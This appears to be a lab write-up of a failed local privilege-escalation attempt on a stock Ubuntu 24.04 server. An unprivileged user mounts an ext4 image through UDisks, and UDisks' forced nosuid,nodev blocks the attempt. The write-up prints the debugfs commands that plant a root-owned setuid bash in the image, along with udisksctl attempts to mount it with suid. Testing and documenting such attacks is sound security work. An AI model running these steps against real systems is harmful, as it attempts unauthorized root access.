# Negative: active UDisks ext4 setuid image

Date: 2026-05-17
Target: `ubuntu24-server-lpe-target`, stock Ubuntu 24.04.4 Server Docker target
Attacker: `uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)`
Result: no validated uid1001-to-root LPE. `ROOT_PROOF=no`.

Artifacts:

```text
pocs/active_udisks_ext4_suid_probe.sh
logs/active-udisks-ext4-suid-20260517.out
```

## Default proof

The probe captured:

```text
udisks2       2.10.1-6ubuntu1.3
libudisks2-0 2.10.1-6ubuntu1.3
e2fsprogs    1.47.0-2.4~exp1ubuntu4.1
polkitd      124-2ubuntu1.24.04.3
systemd      255.4-1ubuntu8.15
udisks2.service active
```

The active local tty session was real and non-sudo:

```text
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
TTY=tty8
Seat=seat0
Active=yes
State=active
```

The relevant UDisks actions were authorized for that active user:

```text
org.freedesktop.udisks2.loop-setup rc=0
org.freedesktop.udisks2.filesystem-mount rc=0
org.freedesktop.udisks2.modify-device rc=0
```

## Trigger

The active user created an ext4 image and used `debugfs` to place a root-owned setuid bash inside the image before UDisks mounted it:

```text
debugfs write /bin/bash /rootsuidbash
set_inode_field /rootsuidbash uid 0
set_inode_field /rootsuidbash gid 0
set_inode_field /rootsuidbash mode 0104755
```

Default mount:

```text
Mounted /dev/loop0 at /media/attacker/EXT4SUID
/media/attacker/EXT4SUID /dev/loop0 ext4 rw,nosuid,nodev,relatime,errors=remount-ro
-rwsr-xr-x 4755 0:0 root:root /media/attacker/EXT4SUID/rootsuidbash
```

Executing the payload with `bash -p` stayed unprivileged because the mount was `nosuid`:

```text
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
/media/attacker/EXT4SUID/rootsuidbash: /root/active-udisks-ext4-suid-20260517-root: Permission denied
```

The explicit override attempts were blocked server-side:

```text
udisksctl mount -o suid          -> Mount option `suid' is not allowed
udisksctl mount -o suid,exec     -> Mount option `suid' is not allowed
udisksctl mount -o dev,suid,exec -> Mount option `dev' is not allowed
```

An allowed `exec` option still preserved `nosuid,nodev`:

```text
/media/attacker/EXT4SUID /dev/loop0 ext4 rw,nosuid,nodev,relatime,errors=remount-ro
```

## Why it is not an LPE

The dangerous primitive is real: a normal active local user can make root UDisks mount an attacker-controlled ext4 image containing inode metadata that claims `uid=0,gid=0,mode=4755`. In stock default state, UDisks forces `nosuid,nodev` on the resulting mount and rejects the `suid` and `dev` mount options before the kernel sees them. The root-owned setuid inode remains visible as metadata, but the kernel does not honor the setuid bit from that mount.

No root marker was created:

```text
ls: cannot access '/root/active-udisks-ext4-suid-20260517-root': No such file or directory
ROOT_PROOF=no
```

## Cleanup

The probe unmounted `/media/attacker/EXT4SUID`, detached all loop devices backed by `active-udisks-ext4-suid-20260517`, terminated the temporary tty8 attacker session, removed the attacker image/work directory and marker files, restored `getty@tty8.service`, and reset failed state. Final health:

```text
systemctl is-system-running -> running
systemctl --failed -> 0 loaded units listed
```
